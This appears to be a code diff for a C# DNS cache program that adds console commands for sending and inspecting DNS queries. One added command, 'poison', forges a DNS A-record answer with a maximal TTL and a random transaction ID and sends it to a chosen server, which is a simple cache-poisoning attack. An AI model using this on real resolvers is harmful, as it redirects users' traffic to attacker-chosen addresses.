@@ -5,6 +5,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using DnsCache.DnsDataBase;
+using DnsCache.DnsPacket;
 
 namespace DnsCache
 {
@@ -63,6 +64,81 @@ namespace DnsCache
             while (s != "exit")
             {
                 s = (Console.ReadLine() ?? "").ToLowerInvariant();
+                var words = s.Split(' ');
+                switch (words[0])
+                {
+                    case "?":
+                    {
+                        if (words.Length != 3)
+                            break;
+                        DnsQueryType a0;
+                        if (!Enum.TryParse(words[1], true, out a0))
+                            break;
+                        var a1 = words[2];
+                        dns.SendDnsRequestTo(dns.ParentServer, new RequestRecord{Class = DnsQueryClass.IN, Key = a1, Type = a0});
+                        break;
+                    }
+                    case "?l":
+                    {
+                        if (words.Length != 3)
+                            break;
+                        DnsQueryType a0;
+                        if (!Enum.TryParse(words[1], true, out a0))
+                            break;
+                        var a1 = words[2];
+                        var node = dns.DomainRoot.Resolve(a1);
+                        if (node == null)
+                        {
+                            Console.WriteLine("[!]: Not found! domain subtree is nt yet built");
+                            break;
+                        }
+                        var results = node.GetAllRecords(false, a0).ToArray();
+                        Console.WriteLine("[i]: " + results.Length + " results found:");
+                        foreach (var r in results)
+                        {
+                            Console.WriteLine("\t" + r);
+                        }
+                        break;
+                    }
+                    case "??":
+                    {
+                        if (words.Length != 4)
+                            break;
+                        DnsQueryType a0;
+                        if (!Enum.TryParse(words[1], true, out a0))
+                            break;
+                        var a1 = words[2];
+                        IPAddress a2;
+                        if (!IPAddress.TryParse(words[3], out a2))
+                            break;
+                        dns.SendDnsRequestTo(new IPEndPoint(a2, 53), new RequestRecord { Class = DnsQueryClass.IN, Key = a1, Type = a0 });
+                        break;
+                    }
+                    case "poison":
+                    {
+                        if (words.Length != 4)
+                            break;
+                        IPAddress a0;
+                        if (!IPAddress.TryParse(words[1], out a0))
+                            break;
+                        var a1 = words[2];
+                        IPAddress a2;
+                        if (!IPAddress.TryParse(words[3], out a2))
+                            break;
+                        var request = new RequestRecord {Class = DnsQueryClass.IN, Key = a1, Type = DnsQueryType.A};
+                        var answer = new ResourceRecord
+                        {
+                            Class = DnsQueryClass.IN,
+                            Key = a1,
+                            Type = DnsQueryType.A,
+                            Data = a2.GetAddressBytes(),
+                            TTL = int.MaxValue
+                        };
+                        dns.SendDnsResponseTo(new IPEndPoint(a0, 53), (ushort) Rnd.Next(1, 65536), new[] { request }, new[] { answer }, null, new[] { answer });
+                        Console.WriteLine("[!]: Sent!");
+                        break;
+                    }
+                }
             }
             dns.ShouldRun = false;
             t.Abort();
